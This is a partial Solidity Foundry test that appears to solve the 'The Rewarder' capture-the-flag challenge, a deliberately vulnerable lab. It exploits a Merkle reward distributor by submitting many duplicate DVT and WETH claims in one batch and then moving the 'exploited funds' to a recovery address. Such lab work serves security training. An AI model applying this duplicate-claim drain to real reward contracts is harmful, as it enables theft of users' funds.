...
contract TheRewarderChallenge is Test {
    ...
    /*
 Comments: The code for contract was inherently tough to understand which made the solution tough. 
 There were tons of other vulnerabilites which can be exploited.
     */
    function test_theRewarder() public checkSolvedByPlayer {
        // Amount that the player can claim for each token - from json files
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        // Load the Merkle tree data for both tokens
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
        ...
        // by dividing total distribution by claim amount
        ...
        // Set up tokens array for the claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create an array of identical claims
        Claim[] memory claims = new Claim[](totalTxCount);

        // Fill the claims array with identical claims
        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                // Create duplicate DVT claims
                claims[i] = Claim({
                    batchNumber: 0,
        ...
        // Transfer exploited funds to recovery address
